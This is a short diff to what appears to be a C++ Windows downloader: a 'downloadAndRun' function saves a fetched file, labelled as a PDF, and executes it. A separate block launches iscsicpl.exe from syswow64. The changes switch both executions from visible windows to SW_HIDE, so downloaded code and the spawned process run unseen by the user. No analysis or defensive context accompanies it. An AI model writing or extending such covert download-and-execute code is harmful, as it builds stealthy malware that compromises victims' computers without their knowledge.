@@ -175,7 +175,7 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 	std::cout << "PDF file saved to: " << szTempFileName << std::endl;
 
 	if (run == true) {
-		ShellExecute(NULL, L"open", szTempFileName, NULL, NULL, SW_SHOWNORMAL);
+		ShellExecute(NULL, L"open", szTempFileName, NULL, NULL, SW_HIDE);
 	}	
 
 	// Determine the size of the buffer required for the conversion
@@ -305,7 +305,7 @@ int main(int argc, char* argv[])
 			shinfo.lpFile = L"c:\\Windows\\syswow64\\iscsicpl.exe";
 			shinfo.lpParameters = L""; // parameters
 			shinfo.lpDirectory = NULL;
-			shinfo.nShow = SW_SHOW;
+			shinfo.nShow = SW_HIDE;
 			shinfo.lpVerb = NULL;
 			bResult = ShellExecuteEx(&shinfo);
 			if (bResult) {
